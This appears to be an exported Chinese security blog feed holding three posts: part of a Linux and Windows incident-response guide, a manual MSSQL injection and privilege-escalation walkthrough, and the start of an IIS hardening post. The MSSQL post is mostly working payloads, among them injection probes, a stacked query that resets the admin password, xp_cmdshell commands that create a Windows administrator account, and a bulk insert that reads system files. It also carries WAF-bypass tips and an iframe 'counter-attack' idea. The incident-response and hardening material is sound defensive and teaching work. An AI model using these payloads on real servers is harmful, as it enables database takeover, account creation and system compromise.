等手段得出以下应对措施：</p><p>1.根据进程、连接等信息关联的程序，查看木马活动信息</p><p>2.假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p><p>3.发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p><p>4.发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/log/message       包括整体系统信息</span><br><span class="line">/var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog         记录所有等级用户信息的日志。</span><br><span class="line">/var/log/cron           记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/xferlog(vsftpd.log)记录Linux FTP日志</span><br><span class="line">/var/log/lastlog         记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">/var/log/secure         记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last</span><br><span class="line">var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除</span><br></pre></td></tr></table></figure></p><h5 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h5><p>grep,sed,sort,awk</p><h5 id="基于时间的日志管理："><a href="#基于时间的日志管理：" class="headerlink" title="基于时间的日志管理："></a>基于时间的日志管理：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp /var/run/utmp /var/log/lastlog(lastlog) /var/log/btmp(lastb)</span><br></pre></td></tr></table></figure><h5 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h5><p>可以关注Accepted、Failed password 、invalid特殊关键字</p><h5 id="登录相关命令"><a href="#登录相关命令" class="headerlink" title="登录相关命令"></a>登录相关命令</h5><p> lastlog 记录最近几次成功登录的事件和最后一次不成功的登录</p><h5 id="who-命令查询utmp文件"><a href="#who-命令查询utmp文件" class="headerlink" title="who 命令查询utmp文件"></a>who 命令查询utmp文件</h5><p>Who的缺省输出包括用户名、终端类型、登录日期及远程主机</p><h5 id="w-命令查询utmp文件"><a href="#w-命令查询utmp文件" class="headerlink" title="w 命令查询utmp文件"></a>w 命令查询utmp文件</h5><p>显示当前系统中每个用户和它所运行的进程信息</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数</p><h5 id="last-命令"><a href="#last-命令" class="headerlink" title="last 命令"></a>last 命令</h5><p>往回搜索wtmp来显示自从文件第一次创建以来登录过的用户</p><h5 id="finger-命令"><a href="#finger-命令" class="headerlink" title="finger 命令"></a>finger 命令</h5><p>用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</p><h5 id="日志命令"><a href="#日志命令" class="headerlink" title="日志命令"></a>日志命令</h5><p>定位有多少IP在爆破主机的root帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure></p><p>登录成功的IP有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  </span><br><span class="line"></span><br><span class="line">tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">less demo.log #查看日志文件，支持上下滚屏，查找功能  </span><br><span class="line"></span><br><span class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1 </span><br><span class="line"></span><br><span class="line">grep -c &apos;ERROR&apos; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量</span><br></pre></td></tr></table></figure></p><h3 id="相关处置"><a href="#相关处置" class="headerlink" title="相关处置"></a>相关处置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kill -9</span><br><span class="line">chattr –i  加锁</span><br><span class="line">rm</span><br><span class="line">setfacl</span><br><span class="line">ssh</span><br><span class="line">chmod  000  把木马去权限</span><br></pre></td></tr></table></figure><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h4 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h4><ol><li><p>开机启动有无异常文件</p></li><li><p>各个盘下的temp(tmp)相关目录下查看有无异常文件</p></li><li><p>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p></li><li><p>查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p></li><li><p>查看用户recent相关文件，通过分析最近打开分析可疑文件</p></li></ol><p> C:\Documents and Settings\Administrator\Recent</p><p> C:\Documents and Settings\Default User\Recent</p><p> 开始,运行 %UserProfile%\Recent</p><ol start="6"><li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件</li></ol><h4 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h4><ol><li><p><code>netstat -ano</code> 查看目前的网络连接，定位可疑的ESTABLISHED</p></li><li><p>根据netstat 定位出的pid，再通过tasklist命令进行进程定位</p></li><li>通过tasklist命令查看可疑程序</li></ol><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4><p>1.使用set命令查看变量的设置<br>2.Windows 的计划任务；<br>3.Windows 的帐号信息，如隐藏帐号等<br>4.配套的注册表信息检索查看，SAM文件以及远控软件类<br>5.查看systeminfo 信息，系统版本以及补丁信息 例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）… 若进行漏洞比对，建议使用Windows-Exploit-Suggester <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></p><h4 id="后门排查-1"><a href="#后门排查-1" class="headerlink" title="后门排查"></a>后门排查</h4><p>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="noopener">http://www.xuetr.com/</a></p><p>功能列表如下：</p><p>1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能<br>2.内核驱动模块查看，支持内核驱动模块的内存拷贝</p><p>3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook<br>4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除<br>5.端口信息查看，目前不支持2000系统<br>6.查看消息钩子<br>7.内核模块的iat、eat、inline hook、patches检测和恢复<br>8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除<br>9.注册表编辑<br>10.进程iat、eat、inline hook、patches检测和恢复<br>11.文件系统查看，支持基本的文件操作<br>12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook检测和恢复<br>14.DPC定时器检测和删除<br>15.MBR Rootkit检测和修复<br>16.内核对象劫持检测<br>17.WorkerThread枚举<br>18.Ndis中一些回调信息枚举<br>19.硬件调试寄存器、调试相关API检测<br>20.枚举SFilter/Fltmgr的回调</p><p>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p>1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）<br>2.主要分析安全日志，可以借助自带的筛选功能</p><p>3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</span><br></pre></td></tr></table></figure></p><p>4.强大的日志分析工具Log Parser</p><p>#分析IIS日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</span><br></pre></td></tr></table></figure></p><p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</span><br></pre></td></tr></table></figure></p><p>事件ID是很好的索引</p><p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p><h4 id="相关处置-1"><a href="#相关处置-1" class="headerlink" title="相关处置"></a>相关处置</h4><p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p><p>### </p><h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><p>Apache、tomcat、Nginx、IIS<br>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find . access_log |grep xargs ip攻击地址</span><br><span class="line">find . access_log| grep xargs 木马文件名</span><br><span class="line">页面访问排名前十的IP</span><br><span class="line">cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">页面访问排名前十的URL</span><br><span class="line">cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">查看最耗时的页面</span><br><span class="line">cat access.log | sort -k 2 -n -r | head 10</span><br></pre></td></tr></table></figure></p><p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p><p>首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p><img src="\images\pasted-111.png" alt="upload successful"></p><p>一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p><p><img src="\images\pasted-112.png" alt="upload successful"></p><h1 id="应急总结"><a href="#应急总结" class="headerlink" title="应急总结"></a>应急总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">核心思路是“顺藤摸瓜”</span><br><span class="line">碎片信息的关联分析</span><br><span class="line">时间范围的界定以及关键操作时间点串联</span><br><span class="line">Web入侵类，shell定位很重要</span><br><span class="line">假设与求证</span><br><span class="line">攻击画像与路线确认</span><br></pre></td></tr></table></figure><h5 id="常见的入侵方式Getshell方法"><a href="#常见的入侵方式Getshell方法" class="headerlink" title="常见的入侵方式Getshell方法 "></a>常见的入侵方式Getshell方法 </h5><p>a) WEB入侵 i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞 </p><p>b) 系统入侵 i. SSH 破解后登录操作 ii. RDP 破解后登录操作 iii. MSSQL破解后远控操作 iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p><p> c) 典型应用 i. Mail暴力破解后信息挖掘及漏洞利用 ii. VPN暴力破解后绕过边界 iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行 iv. Rsync 未授权访问类 v. Mongodb未授权访问类 vi. Elasticsearch命令执行漏洞 vii. Memcache未授权访问漏洞 viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p><h5 id="应急需求有哪些分类："><a href="#应急需求有哪些分类：" class="headerlink" title="应急需求有哪些分类："></a>应急需求有哪些分类：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> a) 被谁入侵了？ 关联 攻击IP 攻击者信息</span><br><span class="line"></span><br><span class="line"> b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息 </span><br><span class="line"></span><br><span class="line">c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息 </span><br><span class="line"></span><br><span class="line">d) 数据是否被窃取？ 关联 日志审计</span><br><span class="line"></span><br><span class="line"> e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</span><br></pre></td></tr></table></figure><h1 id="资源参考"><a href="#资源参考" class="headerlink" title="资源参考"></a>资源参考</h1><p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-find-webshell.html</a><br><a href="http://vinc.top/category/yjxy/" target="_blank" rel="noopener">http://vinc.top/category/yjxy/</a><br><a href="http://www.shellpub.com/" target="_blank" rel="noopener">http://www.shellpub.com/</a><br><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="noopener">http://linux.vbird.org/linux_security/0420rkhunter.php</a><br><a href="https://cisofy.com/download/lynis/" target="_blank" rel="noopener">https://cisofy.com/download/lynis/</a><br><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="noopener">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a><br><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/23358.html</a><br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="noopener">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a><br><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3830.html</a><br><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/65679</a><br><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="noopener">http://secsky.sinaapp.com/188.html</a><br><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a><br><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="noopener">http://www.sleuthkit.org/autopsy/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>手注mssql</title>
    <link href="http://yoursite.com/2018/08/21/mssql/"/>
    <id>http://yoursite.com/2018/08/21/mssql/</id>
    <published>2018-08-21T15:02:22.000Z</published>
    <updated>2018-08-23T14:38:10.165Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-133.png" alt="upload successful"></p><h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h3 id="1-判断数据库类型："><a href="#1-判断数据库类型：" class="headerlink" title="1.判断数据库类型："></a>1.判断数据库类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;（撇号）</span><br><span class="line">and (select count(*) from 独有表)&gt;0 </span><br><span class="line">oracle:dual</span><br><span class="line">mssql:sysobjects</span><br><span class="line">mysql:shema</span><br><span class="line">access:mssysobjects</span><br></pre></td></tr></table></figure><h3 id="2-判断版本号："><a href="#2-判断版本号：" class="headerlink" title="2.判断版本号："></a>2.判断版本号：</h3><p>（sqlserver:2000）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nt5.0:win2000,nt5.2:2003 nt6.1:win7 sp</span><br><span class="line">and @@version&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="3-当前连接数据库的用户："><a href="#3-当前连接数据库的用户：" class="headerlink" title="3.当前连接数据库的用户："></a>3.当前连接数据库的用户：</h3><p>（dbo=sa）<br><code>and user&gt;0</code></p><h3 id="4-判断当前连接的数据库："><a href="#4-判断当前连接的数据库：" class="headerlink" title="4.判断当前连接的数据库："></a>4.判断当前连接的数据库：</h3><p>(article)<br><code>and db_name()&gt;0</code></p><h3 id="5-判断其它数据库"><a href="#5-判断其它数据库" class="headerlink" title="5.判断其它数据库"></a>5.判断其它数据库</h3><p><code>and (select name from master..sysdatabases where dbid=6)&gt;0</code></p><h3 id="6-判断表："><a href="#6-判断表：" class="headerlink" title="6.判断表："></a>6.判断表：</h3><p>‘t_jiaozhu’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="7-判断其它表："><a href="#7-判断其它表：" class="headerlink" title="7.判断其它表："></a>7.判断其它表：</h3><p>admin<br><code>and name not in(&#39;t_jiaozhu&#39;,&#39;Aclass&#39;)</code><br>加入到6条语句最后一个括号前：</p><h3 id="8-判断列名："><a href="#8-判断列名：" class="headerlink" title="8.判断列名："></a>8.判断列名：</h3><p>admin(usernae,password)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br></pre></td></tr></table></figure></p><h3 id="9-判断值"><a href="#9-判断值" class="headerlink" title="9.判断值"></a>9.判断值</h3><p><code>and (select username from admin)&gt;0</code></p><h3 id="10-改密码："><a href="#10-改密码：" class="headerlink" title="10.改密码："></a>10.改密码：</h3><p>md5,小葵多功能转换工具：111转为md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;--</span><br></pre></td></tr></table></figure></p><p>sqlserver高级操作：</p><h1 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h1><h3 id="一。数据库提权："><a href="#一。数据库提权：" class="headerlink" title="一。数据库提权："></a>一。数据库提权：</h3><h4 id="1-添加数据库的用户；"><a href="#1-添加数据库的用户；" class="headerlink" title="1.添加数据库的用户；"></a>1.添加数据库的用户；</h4><p><code>;exec master..sp_addlogin hyq,888888;--</code></p><h4 id="2-查看："><a href="#2-查看：" class="headerlink" title="2.查看："></a>2.查看：</h4><p><code>mssqlserver--企业管理器--安全性--登录</code></p><h4 id="3-提权："><a href="#3-提权：" class="headerlink" title="3.提权："></a>3.提权：</h4><p>把hyq加入sysadmin组<br><code>;exec master..sp_addsrvrolemember hyq,sysadmin;--</code></p><h4 id="4-利用："><a href="#4-利用：" class="headerlink" title="4.利用："></a>4.利用：</h4><p>数据库连接工具：查询分析器,navicat:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from </span><br><span class="line">drop database</span><br></pre></td></tr></table></figure></p><h3 id="二。操作系统提权"><a href="#二。操作系统提权" class="headerlink" title="二。操作系统提权"></a>二。操作系统提权</h3><h4 id="1-新建用户"><a href="#1-新建用户" class="headerlink" title="1.新建用户:"></a>1.新建用户:</h4><p><code>;exec master..xp_cmdshell &#39;net user cisp 888888 /add &#39;--</code></p><h4 id="2-提权："><a href="#2-提权：" class="headerlink" title="2.提权："></a>2.提权：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;--</span><br></pre></td></tr></table></figure><h4 id="3-利用："><a href="#3-利用：" class="headerlink" title="3.利用："></a>3.利用：</h4><p>3389;ipc空连接</p><h3 id="三。读系统文件"><a href="#三。读系统文件" class="headerlink" title="三。读系统文件"></a>三。读系统文件</h3><p><code>c:\boot.ini</code></p><h4 id="1-数据连接工具：navicat"><a href="#1-数据连接工具：navicat" class="headerlink" title="1.数据连接工具：navicat:"></a>1.数据连接工具：navicat:</h4><h4 id="2-查询–新建查询"><a href="#2-查询–新建查询" class="headerlink" title="2.查询–新建查询"></a>2.查询–新建查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table jjboot(line varchar(5000));</span><br><span class="line">bulk insert jjboot from &apos;c:\boot.ini&apos;;</span><br><span class="line">select * from jjboot</span><br></pre></td></tr></table></figure><h3 id="四。向系统写文件"><a href="#四。向系统写文件" class="headerlink" title="四。向系统写文件"></a>四。向系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;--</span><br><span class="line">a.bat</span><br><span class="line">:1</span><br><span class="line">start iexplore.exe</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure><h3 id="五。xp-cmdshell防御："><a href="#五。xp-cmdshell防御：" class="headerlink" title="五。xp_cmdshell防御："></a>五。xp_cmdshell防御：</h3><h4 id="1-删除："><a href="#1-删除：" class="headerlink" title="1.删除："></a>1.删除：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br></pre></td></tr></table></figure><h4 id="2-恢复："><a href="#2-恢复：" class="headerlink" title="2.恢复："></a>2.恢复：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br></pre></td></tr></table></figure><h4 id="3-防xp-cmdshell"><a href="#3-防xp-cmdshell" class="headerlink" title="3.防xp_cmdshell."></a>3.防xp_cmdshell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">防未公布：cmd反弹</span><br><span class="line">c:\windows\system32\cmd.exe</span><br><span class="line">删除所有默认权限，添加administrator--完全控制</span><br></pre></td></tr></table></figure><h3 id="六-防注入："><a href="#六-防注入：" class="headerlink" title="六.防注入："></a>六.防注入：</h3><h4 id="1-脚本调用："><a href="#1-脚本调用：" class="headerlink" title="1.脚本调用："></a>1.脚本调用：</h4><p>编写防注入脚本：noinject.asp<br>过滤关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and or union ; &apos; sp_ xp_ update</span><br><span class="line">exec select delete drop</span><br><span class="line">防post get cookie</span><br></pre></td></tr></table></figure></p><p>判断哪个脚本有漏洞<br>调用：<code>include file=noinject.asp</code><br>最前面：搜索型</p><h4 id="2-安全编码："><a href="#2-安全编码：" class="headerlink" title="2.安全编码："></a>2.安全编码：</h4><p>int–&gt;cint,参数化查询：</p><h4 id="3-waf"><a href="#3-waf" class="headerlink" title="3.waf:"></a>3.waf:</h4><p>web app fw: 软件，硬件<br>sqlmap:tamper:base<br>通配符：cat ??t /etc/passwd<br>as /**/<br>hash:<br>sqlmap.py -u url -v 3</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web终极加固</title>
    <link href="http://yoursite.com/2018/08/21/web%E7%BB%88%E6%9E%81%E5%8A%A0%E5%9B%BA-mssqlserver/"/>
    <id>http://yoursite.com/2018/08/21/web终极加固-mssqlserver/</id>
    <published>2018-08-21T14:18:05.000Z</published>
    <updated>2018-08-23T14:40:21.488Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-134.png" alt="upload successful"></p><h2 id="一-中间件加固：tomcat-weblogic-iis"><a href="#一-中间件加固：tomcat-weblogic-iis" class="headerlink" title="一.中间件加固：tomcat,weblogic,iis"></a>一.中间件加固：tomcat,weblogic,iis</h2><p>iis服务管理器-网站–dvbbs–右键–属性</p><h4 id="1-更改默认日志的路径："><a href="#1-更改默认日志的路径：" class="headerlink" title="1.更改默认日志的路径："></a>1.更改默认日志的路径：</h4><p>c:\windows\system32\logfiles:改为d:\dvbbslog:仅system可读写，administrator:读</p><p>日志存放&gt;6个月      w3c:  biglog（日志分析）   ,splunk(日志分析)</p><p>网站–属性</p><h3 id="2-高级：必选协议版本："><a href="#2-高级：必选协议版本：" class="headerlink" title="2.高级：必选协议版本："></a>2.高级：必选协议版本：</h3><p>客户端，cookie:取证</p><p>wireshark:</p><h4 id="3-不要给写入权限："><a href="#3-不要给写入权限：" class="headerlink" title="3.不要给写入权限："></a>3.不要给写入权限：</h4><p>防上传webshell:<br>主目录</p><h4 id="4-不要给目录浏览权限："><a href="#4-不要给目录浏览权限：" class="headerlink" title="4.不要给目录浏览权限："></a>4.不要给目录浏览权限：</h4><p>产生目录遍历</p><p>主目录：</p><h4 id="5-删除不必要映射："><a href="#5-删除不必要映射：" class="headerlink" title="5.删除不必要映射："></a>5.删除不必要映射：</h4><p>主目录–配置：不用到扩展名映射删除，上传.cer</p><h4 id="6-向客户端发送自定义错误信息："><a href="#6-向客户端发送自定义错误信息：" class="headerlink" title="6.向客户端发送自定义错误信息："></a>6.向客户端发送自定义错误信息：</h4><p>反制黑客：<code>&lt;iframe src=http://ip&gt;&lt;/iframe&gt;</code></p><p>主目录–配置–调试：</p><h4 id="7-中层安全策略："><a href="#7-中层安全策略：" class="headerlink" title="7.中层安全策略："></a>7.中层安全策略：</h4><p>限制后台登录ip:<br>admin右键–目录安全性–ip或域名限制<br>允许：192.168.2.6</p><h4 id="8-删除所有自定义错误信息：防黑客："><a href="#8-删除所有自定义错误信息：防黑客：" class="headerlink" title="8.删除所有自定义错误信息：防黑客："></a>8.删除所有自定义错误信息：防黑客：</h4><p>302：挂马页面<br>C:\WINDOWS\help\iisHelp\common\</p><h2 id="二-数据库加固"><a href="#二-数据库加固" 